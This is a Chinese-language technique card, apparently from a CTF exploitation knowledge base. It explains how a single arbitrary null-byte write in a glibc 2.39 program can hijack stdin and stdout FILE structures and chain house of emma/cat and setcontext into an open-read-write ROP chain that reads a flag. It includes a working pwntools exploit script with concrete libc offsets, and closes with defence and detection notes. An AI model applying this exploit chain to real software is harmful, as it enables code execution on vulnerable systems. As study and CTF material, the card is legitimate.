---
id: binary-pwn-heap-nullbyte-stdin-buffer-expand-stdout-fsop
title: 单次任意地址写 00 扩大 stdin 输入缓冲区：覆盖 stdout FILE → puts _IO_sputn → house of emma/cat → setcontext ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: nullbyte-stdin-buffer-expand-stdout-fsop
aliases:
- 任意地址写00到RCE
- stdin 缓冲区扩展
- _IO_buf_base 末字节清零
- house of emma
- house of cat
- puts _IO_sputn 劫持
- setcontext 栈迁移 ORW
- 强网杯 bph
tags:
- pwn
- glibc
- fsop
- io-file
- stdin
- stdout
- house-of-emma
- house-of-cat
- setcontext
- orw
- seccomp
cve: []
severity: high
confidence: high
status: verified
affected_versions: glibc 2.39
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V198
  verified_at: '2026-11-06T22:47:51+08:00'
  notes: 已对照原文核对：create 超大 size 导致 malloc 失败后仍执行 ptr+size-1=0、stdin _IO_buf_base/_IO_buf_end 偏移 0x38/0x40、第二次输入改写缓冲区指向 stdout、_IO_wfile_jumps+0x10/house of emma/cat、setcontext+61/294、mov dl 0x65 ORW 均与原文一致；affected_versions 按原文记 glibc 2.39
---

## 一句话结论

当程序只给一次“任意地址写一个 0 字节”且用 `fgets`/`fread` 从 stdin 读输入时，把 `_IO_2_1_stdin_._IO_buf_base` 的末字节清零，可把输入缓冲区起点前移、扩大可写范围；下一次输入即可改写 `_IO_buf_base/_IO_buf_end` 指向 stdout，再下一次输入覆盖 stdout FILE 结构，借 `puts` 的 `_IO_sputn` 调用配合 house of emma/house of cat 跳到 `setcontext+61`，最终栈迁移执行 ORW ROP 读 flag。

## 原理

- **任意写 0 的来源**：示例 `create()` 先 `malloc(size)`，若 size 极大 malloc 返回 NULL，`read(0, NULL, size)` 失败，但随后仍执行 `*((char *)ptr + size - 1) = 0`；`ptr` 为 NULL 时等价于向地址 `size - 1` 写一个 0 字节。选择 `size = target + 1` 即可向 `target` 写 0。
- **stdin 缓冲区结构**：`_IO_FILE_plus` 偏移 0x38 是 `_IO_buf_base`，0x40 是 `_IO_buf_end`。初始输入缓冲区很小（示例 1 字节），`_IO_buf_base` 指向 `_IO_2_1_stdin_+0x84` 附近；把 `_IO_buf_base` 的最低字节清零，指针从 `...0964` 变为 `...0900`，而 `_IO_buf_end` 仍是 `...0964`，于是下一次 `fgets` 的写入范围从 0x900 到 0x964，正好覆盖 0x918（`_IO_buf_base`）和 0x920（`_IO_buf_end`）。
- **重定向输入缓冲区**：第二次输入在偏移 0x18/0x20 写入 `_IO_2_1_stdout_` 和 `_IO_2_1_stdout_+0x200`，把 stdin 的缓冲区指针改成 stdout 结构体范围；第三次输入就会把攻击者数据直接写到 stdout FILE 上。
- **puts 触发虚调用**：程序随后调用 `puts`，`puts` 走 `_IO_sputn`（vtable+0x38）。把 stdout 的 vtable 设为 `_IO_wfile_jumps+0x10`（house of emma 的偏移技巧），并布置 `_wide_data`/`_wide_vtable`，使 `_IO_wfile_seekoff`/`_IO_switch_to_wget_mode` 路径把 `rdx` 设为可控值（示例 `rdx = [fp+0x20] = fp`），进而 call `[rax+0x18]` 跳到 `setcontext+61`。
- **setcontext 栈迁移**：`setcontext+61` 执行 `rsp = [rdx+0xa0]`、加载 rbx/rbp/r12-r15，再 `push [rdx+0xa8]` 后 `ret`；把 `[rdx+0xa8]` 设为 `setcontext+294`，`[rdx+0xa8+8]` 设为 `read`，即可用 `read(0, fp, 0x400)` 把 ROP 链写到 `fp`，ret 后进入 ROP。
- **为什么能绕过保护**：全开保护（Full RELRO/PIE/Canary/NX/FORTIFY/SHSTK/IBT）下没有栈溢出；利用的是 glibc FILE 结构与其虚表调用，不依赖覆盖返回地址。CET 的 SHSTK/IBT 在示例环境中未阻止该路径。
- **沙箱**：seccomp 只允许 read/write/close/mmap/brk/exit/openat；`open()` 在 glibc 内部就是 `openat(AT_FDCWD, ...)`，因此 ROP 用 `open`/`read`/`write` 完成 ORW 即可。
- **glibc 2.39 无 pop rdx**：ROP 第三参数可用 `mov dl, 0x65; ret` 这类 gadget 设置 rdx 低 8 位（见关联卡），不必找 `pop rdx`。

## 触发条件

- 程序提供一次（或可重复的）任意地址写单个 0 字节，且写地址可由输入控制（示例通过超大 size 触发）。
- 程序使用 `fgets`/`fread` 等从 stdin 读取，且 stdin 使用 glibc 的 FILE 缓冲区。
- 有可控的 libc 地址泄露（示例用栈残留 + `%s` 打印泄露 `free` 地址）。
- 后续会调用 `puts`/`printf` 等触发 stdout 虚表调用，或 `exit` 触发 stderr 虚表调用。
- 目标 glibc 版本支持 house of emma/house of cat 的 `_IO_wfile_jumps`/`_wide_data` 布局（示例 glibc 2.39）。
- 存在 seccomp 时需能构造 ORW ROP（open/read/write 或 openat）。

## 利用步骤

1. 泄露 libc：利用 `sub_1640` 的 0x50 读 + `%s` 打印栈残留，读取 6 字节指针并减去已知偏移（示例 `free` 偏移前 126）得到 libc base。
2. 计算 `target = libc.address + 0x203918`（`_IO_2_1_stdin_+0x38`，`_IO_buf_base` 地址）；在 create 中输入 `size = target + 1`，触发向 `target` 写 0，使 `_IO_buf_base` 低字节归零。
3. 第二次输入：在偏移 0x18/0x20 写入 `stdout` 与 `stdout+0x200`，把 stdin 缓冲区指向 stdout。
4. 第三次输入：写入伪造的 stdout FILE 结构（`_wide_data=fp`、`vtable=_IO_wfile_jumps+0x10`、`[fp+0x18]=setcontext+61`、`[fp+0x20]=fp`、`[fp+0xa0]=fp`、`[fp+0xa8]=setcontext+294`、`[fp+0xa8+8]=read` 等）。
5. 程序调用 puts，触发 `_IO_sputn` → house of emma/cat → setcontext+61；setcontext+294 以 `read(0, fp, 0x400)` 读入 ROP 链。
6. ROP：`open("/flag",0)` → `read(3, buf, N)` → `write(1, buf, N)`；无 pop rdx 时用 `mov dl, 0x65; ret` 设置第三参数。
7. 读取 flag。

## PoC

关键 exploit 片段（原文，pwntools）：

```python
# 1. 泄露 libc
payload = cyclic(0x28)
sa(b"token: ", payload)
ru(cyclic(0x28))
leak = r(6).ljust(8, b"\x00")
leak = unpack(leak) - 126
libc.address = leak - libc.sym.free

# 2. 写 0 到 stdin->_IO_buf_base 末字节
target = libc.address + 0x203918
sla(b"Choice: ", b"1")
sla(b"Size: ", str(target + 1).encode())
sa(b": ", b"aaaa")

# 3. 改写 stdin 的 _IO_buf_base/_IO_buf_end 指向 stdout
payload = pack(0) * 3 + pack(libc.sym._IO_2_1_stdout_) + pack(libc.sym._IO_2_1_stdout_ + 0x200)
s(payload)

# 4. 伪造 stdout FILE，puts 触发 setcontext
fp = libc.sym._IO_2_1_stdout_
io_payload = flat({
    0x18: pack(libc.sym.setcontext + 61),
    0x20: pack(fp),
    0x68 + 8: pack(0),          # rdi
    0x70 + 8: pack(fp),         # rsi
    0x88: pack(fp + 8),         # lock
    0x88 + 8: pack(0x400),      # rcx
    0xa0: pack(fp),             # _wide_data
    0xa8: pack(libc.sym.setcontext + 294),
    0xa8 + 8: pack(libc.sym.read),
    0xc0: pack(0),              # mode
    0xd8: pack(libc.sym._IO_wfile_jumps + 0x10),
    0xe0: pack(fp),             # _wide_vtable
}, filler=b"\x00")
s(io_payload)

# 5. ORW（无 pop rdx，用 mov dl, 0x65; ret）
mov_dl_0x65_ret = libc.address + 0x1a1fab
buf = fp + 0x150
rop = ROP(libc, fp)
rop.open("/flag", 0)
rop.raw(mov_dl_0x65_ret)
rop.read(3, buf)
rop.raw(mov_dl_0x65_ret)
rop.write(1, buf)
s(rop.chain())
```

## 变体与关联

- 触发点可换成 `exit` 的 stderr 虚表（house of apple 2 等），但本例利用 stdout 的 `puts` 调用。
- 若程序只允许写 0 到固定地址，可寻找 stdin/stdout/stderr 的 `_IO_buf_base`、`_wide_data`、vtable 等低字节可清零的目标。
- house of emma 与 house of cat 的组合可替换为其它 FSOP 链（house of apple 2、house of some），取决于 glibc 版本与可控字段。
- 无 pop rdx 的 ORW 可换用其它 `mov dl, imm; ret`、`mov edx, imm; ret`、`pop rdx; ret`（若有）或 `setcontext` 直接设置 rdx。
- 关联：[[binary-pwn-heap-leakless-mp-tcache-bins-stdout-fsop]]（另一条 stdout FSOP 链，前置是 largebin attack 而非 null-byte 写）。
- 关联：[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（stderr/exit 触发的同类 FSOP）。
- 关联：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（setcontext+61 栈迁移 ORW 的另一入口）。

## 检测与防御

- 修复写 0 的越界：检查 `malloc` 返回值，`read` 失败/长度为 0 时不要执行 `ptr[size-1]=0`；对 `size` 做上限校验（禁止超大 size 导致 `ptr+size-1` 回绕/任意地址）。
- 使用 `fgets` 时确保缓冲区大小与 FILE 缓冲区一致；不要依赖 stdin 缓冲区指针的完整性。
- 开启 glibc 的 `_IO_FILE` 加固/`FORTIFY`，及时更新 glibc；FSOP 利用依赖具体版本的 vtable/wide_data 布局。
- 对 seccomp 沙箱保留最小 syscall 集，但不要仅依赖沙箱阻止 ORW；结合 ASLR 泄露防护（减少栈残留、避免 `%s` 打印未初始化缓冲区）。
- 检测：单次超大 size 的分配、向 libc FILE 区域写 0、后续对 stdout 结构的异常覆盖、`puts` 期间 `_IO_sputn` 跳到 `setcontext`、ROP 链中的 `open/read/write` 序列。
